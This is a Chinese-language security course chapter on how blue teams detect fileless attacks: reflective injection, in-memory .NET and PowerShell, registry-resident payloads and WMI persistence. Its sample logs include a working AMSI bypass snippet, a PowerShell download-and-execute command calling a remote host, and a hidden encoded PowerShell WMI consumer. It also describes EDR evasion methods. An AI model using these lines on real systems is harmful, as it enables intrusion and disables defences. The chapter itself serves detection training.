# Ch 32 — Fileless / In-Memory 威脅偵測

> 目標：從紅隊的視角理解藍隊怎麼抓無檔案攻擊（fileless attack）。你已經知道怎麼打，現在學懂為什麼打得過去以及打不過去的邊界在哪裡。

---

## 為什麼需要這章

你會 reflective DLL injection、會 PowerShell in-memory、會 WMI persistence。但你知道藍隊拿到的 log 長什麼樣嗎？知道 AMSI bypass 成功之後 Event 4104 還在嗎？知道 windows.malfind 為什麼會把你的 payload 跟合法的 JIT 頁面一起吐出來嗎？

不知道就是盲點。紅隊只會打但不懂藍隊能看到什麼，遲早在不該失手的地方露出來。這章的任務是讓你能在攻擊計畫裡準確估算哪些行為會被看到、哪些真的在盲區。

---

## 建立直覺

傳統防毒（AV）的核心是檔案掃描：執行前掃磁碟上的 PE，比對 signature。Fileless 攻擊的本質就是繞過這道門：payload 從來不以完整 PE 的形式存在磁碟上，或者根本不存在磁碟。

但「不落地」不代表不留痕跡。每一個 fileless 技術都依賴作業系統的某個介面，而那個介面幾乎都有對應的 telemetry（遙測資料）：

- 記憶體分配會走 `VirtualAlloc` / `NtAllocateVirtualMemory`
- 跨程序注入要呼叫 `CreateRemoteThread` 或 `NtCreateThreadEx`
- PowerShell 執行 script block 前一定過 AMSI（Antimalware Scan Interface）
- .NET runtime 載入 assembly 時發 ETW（Event Tracing for Windows）事件
- WMI subscription 寫入 repository 時 Sysmon 看得到

防禦的核心邏輯：**攻擊者繞過了檔案掃描，但只要有任何作業系統介面被呼叫，就有機會留下 telemetry。** 藍隊的工作是確保每條 telemetry 管道都開著、都有人看。

---

## 底層機制

### 為什麼 EDR 的 API hook 是主戰場

現代 EDR 把 DLL（通常是自己的 agent DLL）注入進每個程序，在 ntdll.dll 的函數入口放 hook（通常是 `jmp` 指令跳轉到 EDR 自己的分析程式碼）。這讓 EDR 能在 API 層攔截可疑呼叫。

問題在於：ntdll 的 hook 存在於 user-mode，攻擊者可以繞過：

1. **Direct syscall（直接系統呼叫）**：不走 ntdll，直接用 `syscall` 指令進 kernel，EDR 的 user-mode hook 失效
2. **Unhooking**：從磁碟讀一份乾淨的 ntdll，把自己程序裡被 hook 的版本覆蓋回去
3. **Heaven's Gate（32-bit 進 64-bit）**：在 WoW64 程序裡直接進 64-bit syscall

這些繞過技術讓 API hook 不可靠，所以成熟的 EDR 同時有 kernel-mode driver 做補充（callback 在 kernel 層，不能被 user-mode unhook）、ETW 收 telemetry、以及記憶體掃描。

### Unbacked Executable Memory 的核心概念

正常程序的可執行記憶體頁（executable memory page）都「有檔案支撐（image-backed）」：映射自某個磁碟上的 PE 或 DLL，`NtQueryVirtualMemory` 查 `MemoryMappedFilenameInformation` 會拿到路徑。

Reflective injection 注入的頁面是用 `VirtualAlloc(MEM_COMMIT | MEM_RESERVE)` 分配的私有記憶體（MEM_PRIVATE），沒有對應的磁碟檔案。這就是 **unbacked executable memory（無映射可執行記憶體）**，是最強的記憶體層 indicator of compromise (IOC)。

查法：

```
NtQueryVirtualMemory → MemoryBasicInformation → State==MEM_COMMIT, Type==MEM_PRIVATE, Protect==PAGE_EXECUTE_READ (or _READWRITE)
NtQueryVirtualMemory → MemoryMappedFilenameInformation → 失敗 (沒有對應路徑)
```

這個組合就是 malfind 的核心邏輯。

---

## Fileless 類型分類與偵測對策

### a. Reflective PE Injection（反射 DLL 注入）

**攻擊者視角**：不走 `LoadLibrary`，自己 parse PE header、手動 map sections、修 relocation、解 import，然後跳到 entry point。整個過程在目標程序的私有記憶體裡發生，沒有磁碟檔案。

**藍隊看到什麼**：

1. **Sysmon Event ID 8（CreateRemoteThread）**：攻擊者用 `CreateRemoteThread` 在目標程序起始注入的執行緒。這張事件記錄 SourceProcessId、TargetProcessId、StartAddress。

2. **Sysmon Event ID 10（ProcessAccess）**：注入前要先 `OpenProcess` 取得 handle，Sysmon 記錄呼叫者和目標、存取遮罩（access mask）。

3. **windows.malfind**（Volatility 3 記憶體鑑識外掛）：掃記憶體 dump，找 MEM_PRIVATE + PAGE_EXECUTE 頁面，前幾個 byte 是 `4D 5A`（MZ header）就標記。

```
（示意，依樣本而異）
$ vol -f memory.dmp windows.malfind --pid 1234

PID     Process         Start               End                 VadTag  Protection  Hexdump
------  --------------  ------------------  ------------------  ------  ----------  -------
1234    explorer.exe    0x0000020a3f400000  0x0000020a3f4fffff  VadS    PAGE_EXECUTE_READ_WRITE
                                                                         4d 5a 90 00 03 00 00 00
                                                                         04 00 00 00 ff ff 00 00
                                                                         ...
Disassembly:
0x0000020a3f400000  4d5a            dec ebp
0x0000020a3f400002  9000            ...
```

4. **YARA 對 live memory 掃描**：EDR 定期對各程序的私有可執行頁做 YARA 掃描，匹配 shellcode 特徵（如 `WinExec` 字串、常見 ROP gadget 序列、known shellcode byte pattern）。

---

### b. .NET In-Memory Assembly 載入

**攻擊者視角**：用 `System.Reflection.Assembly.Load(byte[])` 把 .NET assembly 直接從 byte array 載進 CLR（Common Language Runtime），沒有寫磁碟。Process hollowing 的 managed 版本。

**藍隊看到什麼**：

1. **ETW provider：Microsoft-Windows-DotNETRuntime**。事件 `AssemblyLoad`（EventID 154）記錄被載入的 assembly 名稱、是否從 byte array 載入（而非磁碟）。如果 assembly 沒有 strong name 或名稱空白，就很可疑。

   ```
   （示意，依樣本而異）
   EventID: 154 (AssemblyLoad)
   AssemblyName: ""
   AssemblyFlags: 0x8 (dynamic)
   ClrInstanceID: 1
   ```

   AssemblyFlags 帶 `dynamic` 旗標代表從 byte array 動態載入，正常應用程式不會這樣做。

2. **AMSI 掃描 byte array**：從 .NET 4.8 開始，CLR 在 `Assembly.Load(byte[])` 呼叫時主動把 byte array 餵給 AMSI。如果 payload 被 AMSI 掃到，會丟出 `BadImageFormatException` 或 `SecurityException`。

3. **.NET runtime log（CLR crash dump / managed heap 分析）**：在 live 系統可用 dotnet-dump 或 ProcDump 拉 managed heap，查 loaded assemblies 清單。

---

### c. PowerShell In-Memory（無 script 檔案）

**攻擊者視角**：`IEX (New-Object Net.WebClient).DownloadString(url)` 或 `[System.Reflection.Assembly]::Load([Convert]::FromBase64String(b64))`。Payload 從網路拉或從 registry 讀，在 PowerShell process 的記憶體裡執行，沒有 .ps1 檔案。

**藍隊看到什麼**：

1. **Script Block Logging（Event ID 4104）**：這是 PowerShell 偵測的核心。PowerShell 在執行每個 script block 之前，把完整的（de-obfuscated）script block 內容記錄到 Windows Event Log（Microsoft-Windows-PowerShell/Operational）。就算攻擊者用了字串拼接、`char()` 轉換、base64，4104 記錄的是 PowerShell 引擎實際要執行的那份。

   ```
   （示意，依樣本而異）
   EventID: 4104
   Source: Microsoft-Windows-PowerShell
   Level: Warning (5 - Suspicious)
   ScriptBlockText:
     $b = [Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...')
     [System.Reflection.Assembly]::Load($b)
   ```

2. **Sysmon Event ID 1（Process Create）**：PowerShell 啟動的命令列。`-EncodedCommand`、`-NonInteractive`、`-WindowStyle Hidden`、從 `%TEMP%` 執行、parent 是 `wscript.exe` 或 `mshta.exe`——這些組合都是紅旗。

3. **AMSI**：PowerShell 每次執行 script block 前把內容送給 AMSI。AMSI 不只是 AV 的 plugin 點，Windows Defender ATP 本身也有 AMSI provider，把掃描結果送到 cloud 分析。

4. **Module Logging（Event ID 4103）**：記錄 PowerShell module 的輸入輸出，比 4104 更細。大多數環境只開 4104 就夠了。

---

### d. Registry-Resident Payload（登錄檔居住）

**攻擊者視角**：把 shellcode 或 PowerShell script 存在 registry 的 binary value（例如 `HKCU\Software\malware\data`），然後在 Run key 裡放一條 PowerShell 命令，開機時讀 registry value 直接執行。Payload 全程在 registry 裡，不落磁碟。

**藍隊看到什麼**：

1. **Sysmon Event ID 13（Registry Value Set）**：registry value 被寫入時的事件，記錄路徑、value name、value type（REG_BINARY）、寫入的程序。Binary value 寫入非系統路徑是偵測點。

2. **Persistence key 監控**：
   - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
   - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
   - `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`

   Sysmon Event 13 對這些路徑設 filter 是基礎配置。

3. **高 entropy binary value**：加密或壓縮的 shellcode entropy 接近 8.0（最大值），正常應用程式的 registry binary 很少到這個值。可用 PowerShell 或 python-registry 批量計算 registry value 的 Shannon entropy（Shannon entropy）。

4. **Run key 觸發的 PowerShell 命令列**：父程序是 explorer.exe，子程序是 powershell.exe，命令列包含 `Get-ItemPropertyValue` 讀 registry 然後直接 `IEX` 或 `[System.Reflection.Assembly]::Load`——這個 execution chain 本身就是強 indicator。

---

### e. WMI-Resident（WMI 事件訂閱）

**攻擊者視角**：用 WMI permanent event subscription（永久事件訂閱）建立 persistence。三個物件缺一不可：`__EventFilter`（觸發條件，例如每 60 秒）、`__EventConsumer`（執行的動作，例如 CommandLineEventConsumer 跑 cmd.exe）、`__FilterToConsumerBinding`（把兩者綁在一起）。Payload 存在 WMI repository（`C:\Windows\System32\wbem\Repository`），不是普通的磁碟 PE。

**藍隊看到什麼**：

1. **Sysmon Event ID 19/20/21**：
   - 19：WMI Event Filter 建立
   - 20：WMI Event Consumer 建立
   - 21：FilterToConsumer Binding 建立

   三張一組就是 WMI persistence 被寫入的完整 trace。如果只看到 19 沒有 21，可能是 OPSEC 意識好的攻擊者分開時間寫。

2. **wmiprvse.exe 衍生非預期子程序**：WMI subscription 觸發時由 `wmiprvse.exe` 執行，所以惡意 payload 的 parent process 是 `wmiprvse.exe`。`wmiprvse.exe` spawning `cmd.exe`、`powershell.exe`、`wscript.exe` 是強 IOA（Indicator of Attack）。

3. **主動清查 WMI 訂閱**：

   ```powershell
   Get-WMIObject -Namespace root\subscription -Class __EventFilter
   Get-WMIObject -Namespace root\subscription -Class __EventConsumer
   Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding
   ```

   正常系統裡這三張表應該是空的，或者只有 SCCM/endpoint agent 的合法訂閱。

---

## 偵測手段詳解

### 記憶體 YARA 掃描

對 live memory 或 memory dump 掃描，找 shellcode 特徵、PE header、已知 C2 framework 的 stager 特徵。EDR 的 periodic memory scan 本質上就是這個。

關鍵點：YARA 對 live memory 的效果取決於觸發時機——掃描間隔越長，攻擊者越有機會完成任務後把 payload 從記憶體清掉（反鑑識手法，見 Ch 33）。好的 EDR 在可疑行為發生時立即觸發掃描，而不是靠排程。

### AMSI 的工作原理與失效信號

AMSI 是 Windows 提供的統一 API，讓 script engine（PowerShell、VBScript、JScript、.NET）在執行 script 前把內容送給已安裝的 AMSI provider（通常是 Defender）掃描。

AMSI bypass 的常見手法是在 `amsi.dll` 的 `AmsiScanBuffer` 函數入口寫入 `xor eax, eax; ret`（或類似 patch），讓函數永遠回傳「乾淨（clean）」。這個 patch 發生在當前 PowerShell session 的 user-space，不影響其他程序。

**AMSI bypass 的偵測信號**：

- Sysmon Event 10（ProcessAccess）顯示對 `amsi.dll` 所在的記憶體區域有 write 操作
- Event 4104 記錄到 bypass 嘗試本身（因為 bypass 通常發生在 script block 開頭，這個 block 本身會被 4104 記錄）
- bypass 成功後，後續 script block 的 AMSI 掃描事件在 Defender 日誌裡消失——「消失」這個模式本身是 indicator

### Script Block Logging 的細節

Event 4104 的 Level 欄位很重要：PowerShell 自己的 heuristic 認為可疑的 block 會標 Level 5（Warning），正常的是 Level 3（Verbose）。優先看 Warning 等級的 4104。

Event 4104 的 ScriptBlockText 是 PowerShell 引擎解析後要執行的版本，所以大部分 obfuscation 在這裡會被展開。攻擊者知道這點，進階的手法是用 constrained language mode（受限語言模式）bypass 或在 out-of-process runspace 執行來迴避 4104 的完整記錄。

### Unbacked Memory 偵測的實作

```powershell
# 用 PowerShell + P/Invoke 掃目標程序的 VAD（Virtual Address Descriptor）
# 找 MEM_PRIVATE + PAGE_EXECUTE 且沒有 mapped file 的頁面
# 實務上 EDR 在 kernel-mode driver 裡做這件事，這裡是示意
Get-Process | ForEach-Object {
    $pid = $_.Id
    # 呼叫 NtQueryVirtualMemory 遍歷所有 pages
    # 對每個 PAGE_EXECUTE* 頁面查 MemoryMappedFilenameInformation
    # 失敗 → 沒有對應 image → unbacked executable memory
}
```

Volatility 3 的 `windows.malfind` 做的就是這件事，但對 memory dump 做，而不是 live process。

---

## 具體範例

### 範例一：Reflective DLL Injection 偵測

攻擊者用 Metasploit 的 `windows/x64/meterpreter/reverse_tcp` 注入到 explorer.exe。

**Sysmon Event ID 8 輸出**：

```
（示意，依樣本而異）
EventID: 8
SourceImage: C:\Windows\System32\rundll32.exe
SourceProcessId: 4512
TargetImage: C:\Windows\explorer.exe
TargetProcessId: 2340
StartAddress: 0x000001E3B2A40000
StartModule: -
StartFunction: -
```

`StartModule` 是 `-`（空）代表 StartAddress 落在沒有 mapped image 的記憶體頁，這是強 IOC。合法的 `CreateRemoteThread` 呼叫通常 `StartFunction` 會有值（例如 `LoadLibraryA`）。

**Volatility windows.malfind 對應輸出**：

```
（示意，依樣本而異）
PID: 2340  Process: explorer.exe
VAD: 0x000001E3B2A40000 - 0x000001E3B2B3FFFF
Protection: PAGE_EXECUTE_READ_WRITE
Type: MEM_PRIVATE
Hexdump:
  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00   MZ..............
  b8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00   ........@.......
```

MZ header + MEM_PRIVATE + PAGE_EXECUTE_READ_WRITE = 幾乎確定是注入的 PE。

**失效案例**：攻擊者在 payload 起跑後把 MZ header 清掉（把前 2 個 byte 改成 `0x00`），malfind 就找不到 MZ 特徵。但 YARA 可以用其他 PE 內部特徵（section header magic、DOS stub 殘留）補漏。

---

### 範例二：PowerShell In-Memory + AMSI Bypass

攻擊者下載一個 Cobalt Strike stager，先跑 AMSI bypass，再 `IEX` 執行。

**Event 4104（bypass 本身被記錄）**：

```
（示意，依樣本而異）
EventID: 4104
Level: Warning
ScriptBlockText:
  $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
  $b = $a.GetField('amsiInitFailed','NonPublic,Static')
  $b.SetValue($null,$true)
```

這個 bypass 把 `amsiInitFailed` 設為 `true`，讓 PowerShell 認為 AMSI 初始化失敗、跳過掃描。但 4104 在 bypass 之前就已經記錄了這個 script block——因為 4104 由 PowerShell 引擎本身記錄，不依賴 AMSI。

**bypass 成功後的 4104**：

```
（示意，依樣本而異）
EventID: 4104
Level: Verbose  ← 不再是 Warning，因為 AMSI 回傳「乾淨」
ScriptBlockText:
  IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')
```

AMSI 認為這是乾淨的，所以 Level 降為 Verbose。但 4104 仍然記錄了 `IEX` + 外部 URL 這個組合，藍隊看到的 AMSI Warning 突然消失、緊接著出現 IEX + 外部連線，這個前後模式本身就是 IOA。

**Edge case**：攻擊者用 Constrained Language Mode (CLM) bypass 或在 separate runspace 執行，可能讓 4104 不記錄後續 block 的完整內容。這時 Sysmon Event 1 的命令列和 network connection log 是備用偵測面。

---

### 範例三：WMI Persistence 偵測

攻擊者用 `Register-WMIEvent`（或直接 WMI API）建立訂閱，每 60 秒執行 PowerShell 下載器。

**Sysmon Event 19/20/21**：

```
（示意，依樣本而異）
EventID: 19 (WmiEventFilter)
Name: WindowsUpdate
Query: SELECT * FROM __TimerEvent WHERE TimerID='ev60'
QueryLanguage: WQL

EventID: 20 (WmiEventConsumer)
Name: WindowsUpdateConsumer
Type: CommandLineEventConsumer
Destination: powershell.exe -nop -w hidden -c "IEX..."

EventID: 21 (WmiEventFilterToConsumerBinding)
Filter: WindowsUpdate
Consumer: WindowsUpdateConsumer
```

三張事件的 Name 欄位都用了「WindowsUpdate」偽裝，這種假冒系統名稱的手法在 threat hunting 裡是 known TTP。

**wmiprvse.exe 子程序**：

```
（示意，依樣本而異）
EventID: 1 (Process Create)
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -nop -w hidden -enc TVqQAAMAAAA...
```

`wmiprvse.exe` → `powershell.exe` 這條 parent-child 鏈，加上 `-enc`（encoded command），藍隊不需要解密就知道這是惡意的。

**主動清查**：

```powershell
Get-WMIObject -Namespace root\subscription -Class __EventFilter |
    Select-Object Name, Query | Format-List

# 正常系統輸出應該是空或只有 SCCM 相關訂閱
# 看到 TimerEvent / ProcessStartTrace 相關 query 就要追查
```

---

## 比較表：各技術的偵測難度與主要 IOC

| 技術 | 主要 Telemetry | 偵測難度 | 主要盲點 |
|------|---------------|---------|---------|
| Reflective PE injection | Sysmon 8/10 + malfind | 中 | MZ header 清除後 malfind 失效 |
| .NET in-memory | ETW AssemblyLoad 154 + AMSI | 中 | ETW provider 未啟用時全盲 |
| PowerShell in-memory | Event 4104 + AMSI | 低（難躲） | CLM bypass、out-of-process runspace |
| Registry-resident | Sysmon 13 + entropy 分析 | 中 | 未監控非標準 registry path |
| WMI subscription | Sysmon 19/20/21 + wmiprvse child | 低（難躲） | Sysmon 未配置 WMI filter |

---

## 踩雷

**1. Script Block Logging 預設是關的**

Event 4104 要靠 Group Policy（群組原則）或 registry 手動啟用：
`HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging → EnableScriptBlockLogging = 1`

很多環境的 SIEM 收不到 4104 純粹是因為從來沒有打開過。稽核環境配置是第一步，不然所有的偵測邏輯都是空的。

**2. Sysmon Event 8 假陽性很多**

`CreateRemoteThread` 是合法操作：Visual Studio 偵錯器用它、AV 用它、遊戲反作弊用它。純靠 Event 8 告警會被淹沒。必須配合 `StartModule` 是否為空、source/target process 組合、以及同一時間是否有其他可疑事件一起判斷。

**3. windows.malfind 的 JIT 假陽性**

.NET 應用程式的 JIT 編譯器會在程序的私有記憶體裡生成 native code，這些頁面也是 MEM_PRIVATE + PAGE_EXECUTE，偶爾前幾個 byte 碰巧跟 MZ 接近。malfind 的輸出要交叉比對：那個 process 是否預期有大量 .NET 執行、頁面大小是否合理、反組譯看起來是否像有意義的 PE 結構。

**4. AMSI bypass 後「消失」是信號，不是成功**

攻擊者在 bypass 成功後以為藍隊就看不到後續動作，但藍隊的 rule 可以比「AMSI alert 觸發」更細：「某個 PowerShell session 先有 4104 Warning 記錄到 amsiInitFailed 相關 pattern，之後同一 session 的 4104 Warning 消失了」。這個轉換點本身就是 IOA，不需要解開 payload 才能告警。

**5. WMI 清查需要管理員權限，且只有三張表**

滲透測試或事件應變時，非管理員帳號查不到 `root\subscription` namespace。而且 WMI persistence 的完整狀態就在這三張表（`__EventFilter`、`__EventConsumer`、`__FilterToConsumerBinding`），刪掉任何一張 binding 就能清除 persistence，不需要動到 Consumer 或 Filter。攻擊者有時故意留下 Filter 但刪掉 Binding，讓清查看起來乾淨但其實 Filter 還在、之後可以重新綁定。

---

## 進階：ETW Provider 層的深度偵測

Sysmon 和 Windows Event Log 是建構在 ETW 之上的高層抽象。真正的深度偵測需要直接訂閱 ETW provider（ETW provider）：

- `Microsoft-Windows-Kernel-Process`：process / thread / image load 事件，kernel 層，很難被 user-mode 繞過
- `Microsoft-Windows-DotNETRuntime`：.NET assembly load、JIT compile、GC 事件
- `Microsoft-Windows-PowerShell`：script block、module 事件（4103/4104 背後的 ETW provider）
- `Microsoft-Windows-WMI-Activity`：WMI query、event subscription 活動

參考 Ch 6 的 Sysmon/ETW 章節了解如何用 `logman` 或 `Microsoft-WindowsAzure-Diagnostics` 直接訂閱 ETW session。

### Kernel Callback 層的偵測（EDR 內部）

成熟 EDR 在 kernel-mode driver 裡用以下 callback 補 user-mode hook 的漏洞：

- `PsSetCreateProcessNotifyRoutine`：process 建立時的 callback
- `PsSetCreateThreadNotifyRoutine`：thread 建立，可以抓到 `CreateRemoteThread` 即使攻擊者 unhook 了 user-mode
- `PsSetLoadImageNotifyRoutine`：image（DLL/EXE）被 map 進任何 process 時觸發——注意：reflective injection 不走 `NtMapViewOfSection`，所以不觸發這個 callback，這是 kernel callback 層的盲點之一

了解這些 callback 的覆蓋邊界，才能理解為什麼進階 loader（如 Donut、sRDI）要特別設計成不走正常的 image map 路徑。

---

## 本章重點整理

- Fileless 攻擊繞過檔案掃描，但無法完全消除 OS telemetry，偵測的核心是確保每條 telemetry 管道都開著並有人看
- Unbacked executable memory（MEM_PRIVATE + PAGE_EXECUTE 但無 mapped file）是 reflective injection 的強 IOC，windows.malfind 與 EDR memory scan 的核心邏輯
- Script Block Logging（Event 4104）是 PowerShell in-memory 偵測的主力，預設關閉，必須手動啟用；AMSI bypass 成功後 4104 仍然記錄 bypass 動作本身
- .NET in-memory 載入靠 ETW `AssemblyLoad` 事件（EventID 154）偵測，dynamic assembly flag 是關鍵判斷
- WMI persistence 留下三張 WMI 表的 Sysmon 19/20/21，以及 wmiprvse.exe 衍生子程序的 parent-child chain
- Registry-resident payload 靠 Sysmon Event 13 + 高 entropy binary value 偵測
- Sysmon Event 8 假陽性多，必須配合 StartModule 空值和 context 判斷；malfind JIT 假陽性需交叉比對
- AMSI bypass 後的「告警消失」模式本身是 IOA，不要只看正向告警

---

## 自我檢核

- [ ] 我能解釋為什麼 EDR API hook 可以被 direct syscall 繞過，以及哪些 telemetry 在 hook 被繞過後仍然有效
- [ ] 我能說出 windows.malfind 的判斷邏輯：什麼條件的記憶體頁面會被標記，以及兩種常見假陽性來源
- [ ] 我知道 Event 4104 需要手動啟用，以及 AMSI bypass 成功後 4104 的行為變化
- [ ] 我能用 PowerShell 查 WMI 三張訂閱表，並說出正常系統應該看到什麼
- [ ] 我能解釋為什麼 Sysmon Event 8 的 `StartModule` 為空是 IOC，而不是只看 Event 8 本身
- [ ] 我能說出 ETW `AssemblyLoad` 事件中哪個 flag 代表 from-byte-array 載入
- [ ] 我知道 registry-resident payload 的高 entropy 是指什麼，以及怎麼計算
- [ ] 我能解釋 kernel callback `PsSetLoadImageNotifyRoutine` 對 reflective injection 為什麼是盲點

---

## 延伸閱讀

1. **Volatility 3 windows.malfind 源碼**（GitHub: volatilityfoundation/volatility3）：讀 `malfind.py` 裡的 `_check_protection` 和 `_check_private`，實際的 VAD traversal 邏輯比任何文章都清楚，20 分鐘讀完。

2. **「The Evolution of AMSI」— Matt Graeber（PowerShell Magazine）**：AMSI 的設計哲學和 bypass 的歷史，解釋為什麼 amsiInitFailed 能 work、以及後來 Microsoft 做了哪些修補嘗試。

3. **Sysmon Community Guide**（github.com/trustedsec/SysmonCommunityGuide）：每個 Event ID 的欄位含義、建議 filter 配置，以及各種假陽性的處理方式。實際部署 Sysmon 前的必讀。

4. **「Detecting DOTNET CLR Injection」— Joe Desimone（Elastic Security Labs）**：ETW DotNETRuntime provider 的實際使用，包括如何用 `perfview` 或自己的 ETW consumer 接收 AssemblyLoad 事件並做 triage。

5. **「An Empirical Assessment of Endpoint Detection and Response Systems against Advanced Persistent Threats Attack Vectors」（USENIX Security 2020）**：學術論文，對多家 EDR 做實測，分析哪些 fileless 技術在哪些產品下能躲過、哪些躲不過，有助於理解偵測的實際邊界而不是理論邊界。

---

→ [Ch 33 反鑑識對抗](./33-anti-forensics-detection.md)
